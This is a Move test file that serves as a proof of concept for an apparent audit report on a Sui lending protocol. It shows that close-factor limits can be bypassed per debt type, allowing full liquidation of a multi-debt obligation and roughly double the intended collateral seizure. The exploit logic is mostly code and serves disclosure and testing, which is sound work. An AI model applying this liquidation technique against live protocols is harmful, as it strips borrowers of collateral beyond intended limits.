// PoC for Report #048: Close Factor Bypass via Per-Debt-Type Threshold
//
// Target: contracts/protocol/sources/internal/market/market.move:994-1006
// Place in: contracts/protocol/tests/integration/test_cases/
// Run:   sui move test --filter poc_048
//
// Bug: ensure_liquidate_borrow_allowed checks close_factor_bypass_min_value
//      against each individual debt type's USD value, not the total obligation
//      debt. A multi-debt obligation where each type is individually below the
//      threshold bypasses close factor for ALL debt types, allowing 100%
//      liquidation even when total debt significantly exceeds the threshold.
//
// Config override:
//   Default close_factor_bypass_min_value = $1. We update to $500 via admin
//   to simulate production-realistic parameters where the bypass matters.
//
// Test parameters:
//   close_factor = 50%, close_factor_bypass_min_value = $500 (updated)
//   ETH CF=70%, LF=70%, liquidation_incentive = 5%

#[test_only]
module protocol::poc_048_close_factor_bypass_per_debt {
    use sui::test_scenario;
    use sui::clock;
    use sui::coin::Coin;

    use protocol::market_t::MainMarket;
    use test_coin::eth::ETH;
    use test_coin::usdc::USDC;
    use test_coin::usdt::USDT;
    use protocol::oracle_t;
    use protocol::open_obligation_t;
    use protocol::market_t::default_eth_decimal_places;
    use protocol::market_t::default_stable_decimal_places;

    const ADMIN: address = @0xAD;
    const BORROWER: address = @0xBB;
    const LIQUIDATOR: address = @0xCC;

    /// Proves that close factor can be bypassed for a multi-debt obligation
    /// when each debt type is individually below close_factor_bypass_min_value
    /// but the total obligation debt exceeds it.
    ///
    /// Scenario:
    ///   close_factor_bypass_min_value = $500, close_factor = 50%
    ///   Obligation: USDC debt = $400, USDT debt = $400 (total = $800)
    ///   Collateral: 1 ETH ($1000) → LTV = 80% (above 70% LF → liquidatable)
    ///
    ///   INTENDED behavior (total debt $800 > $500 threshold):
    ///     Close factor limits each to 50%: max repay = $200 USDC + $200 USDT = $400
    ///     Borrower retains $400 debt, $600 collateral minus incentive
    ///
    ///   ACTUAL behavior (per-type: $400 < $500 threshold):
    ///     Each debt type individually bypasses close factor
    ///     Liquidator repays 100% of each: $400 USDC + $400 USDT = $800
    ///     Borrower loses 2x the intended liquidation penalty
    ///
    /// Test proves: two sequential liquidations (USDC then USDT) each bypass
    /// close factor, achieving full repayment of the obligation.
    #[test]
    fun test_per_debt_type_close_factor_bypass() {
        let mut scenario_value = test_scenario::begin(ADMIN);
        let scenario = &mut scenario_value;
        let mut clock = clock::create_for_testing(scenario.ctx());

        // Step 1: Init market
        let (admin_cap, mut app, mut market, coin_registry) =
            protocol::app_t::default_app_init<MainMarket>(scenario, &mut clock, ADMIN);
        let mut x_oracle = oracle_t::init_t(scenario);

        // Step 2: Update close_factor_bypass_min_value to $500 (production-realistic)
        // Default is $1 which makes all meaningful debts exceed it.
        scenario.next_tx(ADMIN);
        let new_market_config = protocol::market_admin::create_market_config(
            &admin_cap, &app,
            50,   // close_factor = 50%
            500,  // close_factor_bypass_min_value = $500
        );
        protocol::market_admin::update_market<MainMarket>(
            &admin_cap, &app, &mut market, new_market_config, &clock, scenario.ctx()
        );

        // Step 3: Set oracle prices
        clock.set_for_testing(100_000);
        x_oracle.update_price<ETH>(&clock, oracle_t::calc_scaled_price(1000, 0));  // $1000
        x_oracle.update_price<USDC>(&clock, oracle_t::calc_scaled_price(1, 0));    // $1
        x_oracle.update_price<USDT>(&clock, oracle_t::calc_scaled_price(1, 0));    // $1

        // Step 4: Borrower deposits 1 ETH ($1000)
        scenario.next_tx(BORROWER);
        let borrower_cap = open_obligation_t::open_obligation_t<MainMarket>(
            scenario, &app, &mut market
        );
        let eth_coin = sui::coin::mint_for_testing<ETH>(
            1 * 10u64.pow(default_eth_decimal_places()), scenario.ctx()
        );
        protocol::deposit::deposit<MainMarket, ETH>(
            &app, &mut market, &borrower_cap, eth_coin, &clock, scenario.ctx()
        );

        // Step 5: Borrower borrows 400 USDC and 400 USDT (total $800)
        // Capacity: $1000 * 70% CF = $700... but we need $800 borrow
        // So deposit more ETH to have enough capacity.
        scenario.next_tx(BORROWER);

        // Add more collateral: deposit another 1 ETH ($1000 total = $2000)
        let eth_coin2 = sui::coin::mint_for_testing<ETH>(
            1 * 10u64.pow(default_eth_decimal_places()), scenario.ctx()
        );
        protocol::deposit::deposit<MainMarket, ETH>(
            &app, &mut market, &borrower_cap, eth_coin2, &clock, scenario.ctx()
        );

        // Borrow 400 USDC ($400) — safe: $2000 * 70% = $1400 capacity
        scenario.next_tx(BORROWER);
        let usdc_borrow = 400 * 10u64.pow(default_stable_decimal_places());
        let borrowed_usdc = protocol::borrow::borrow<MainMarket, USDC>(
            &app, &borrower_cap, &mut market, &coin_registry,
            usdc_borrow, &x_oracle, &clock, scenario.ctx()
        );
        std::unit_test::destroy(borrowed_usdc);

        // Borrow 400 USDT ($400) — safe: $1400 - $400 = $1000 remaining
        scenario.next_tx(BORROWER);
        let usdt_borrow = 400 * 10u64.pow(default_stable_decimal_places());
        let borrowed_usdt = protocol::borrow::borrow<MainMarket, USDT>(
            &app, &borrower_cap, &mut market, &coin_registry,
            usdt_borrow, &x_oracle, &clock, scenario.ctx()
        );
        std::unit_test::destroy(borrowed_usdt);
        // Total debt: $800 (400 USDC + 400 USDT)
        // Total collateral: 2 ETH = $2000

        // Step 6: Drop ETH price to make position liquidatable
        // Need: weighted_debt > collateral * LF
        // $800 > collateral * 70% → collateral < $1142.86
        // At $570/ETH: 2 ETH = $1140, $1140 * 70% = $798 < $800 → liquidatable
        clock.set_for_testing(101_000);
        x_oracle.update_price<ETH>(&clock, oracle_t::calc_scaled_price(570, 0));

        // Step 7: Setup liquidation permission
        scenario.next_tx(LIQUIDATOR);
        let permit = protocol::whitelist_admin::mint_new_whitelist(
            &admin_cap, &mut app, scenario.ctx()
        );
        protocol::whitelist_admin::update_permission(
            &admin_cap, &mut app, object::id(&permit),
            protocol::whitelist_admin::liquidation(), true
        );

        // Step 8: Liquidate ALL USDC debt ($400)
        // Per-type check: USDC debt = $400 < $500 threshold → BYPASS!
        // Close factor NOT enforced — 100% repayment allowed.
        // With proper total-debt check: $800 > $500 → close factor would
        // limit to 50% = $200 USDC max.
        let usdc_repay = sui::coin::mint_for_testing<USDC>(
            400 * 10u64.pow(default_stable_decimal_places()), scenario.ctx()
        );
        let (seized_eth_1, refund_usdc) =
            protocol::liquidate::liquidate_as_coin<MainMarket, USDC, ETH>(
                &app, &permit, borrower_cap.id(), &mut market,
                usdc_repay, &coin_registry, &x_oracle, &clock, scenario.ctx()
            );

        // Verify: full $400 USDC was repaid (no refund)
        assert!(refund_usdc.value() == 0, 0);
        assert!(seized_eth_1.value() > 0, 1);

        std::unit_test::destroy(seized_eth_1);
        std::unit_test::destroy(refund_usdc);

        // Step 9: Liquidate ALL USDT debt ($400)
        // Per-type check: USDT debt = $400 < $500 threshold → BYPASS!
        // Close factor NOT enforced again — another 100% repayment.
        //
        // Both liquidations can be batched atomically in a single PTB.
        scenario.next_tx(LIQUIDATOR);
        let usdt_repay = sui::coin::mint_for_testing<USDT>(
            400 * 10u64.pow(default_stable_decimal_places()), scenario.ctx()
        );
        let (seized_eth_2, refund_usdt) =
            protocol::liquidate::liquidate_as_coin<MainMarket, USDT, ETH>(
                &app, &permit, borrower_cap.id(), &mut market,
                usdt_repay, &coin_registry, &x_oracle, &clock, scenario.ctx()
            );

        // Verify: full $400 USDT was repaid (no refund)
        assert!(refund_usdt.value() == 0, 2);
        assert!(seized_eth_2.value() > 0, 3);

        // BUG PROVEN: Total repaid = $400 + $400 = $800 (100% of debt)
        // With close factor enforcement: max repay = $400 (50% of $800)
        // Borrower lost 2x the intended liquidation penalty.
        //
        // Seized collateral includes liquidation_incentive (5%) on each:
        //   $400 * 1.05 + $400 * 1.05 = $840 total seized
        //   vs intended $200 * 1.05 + $200 * 1.05 = $420 total seized
        //   Excess seizure: $420 (double the intended amount)

        // Cleanup
        std::unit_test::destroy(seized_eth_2);
        std::unit_test::destroy(refund_usdt);
        clock::destroy_for_testing(clock);
        test_scenario::return_shared(market);
        std::unit_test::destroy(admin_cap);
        std::unit_test::destroy(borrower_cap);
        std::unit_test::destroy(app);
        std::unit_test::destroy(permit);
        std::unit_test::destroy(x_oracle);
        std::unit_test::destroy(coin_registry);
        scenario_value.end();
    }
}
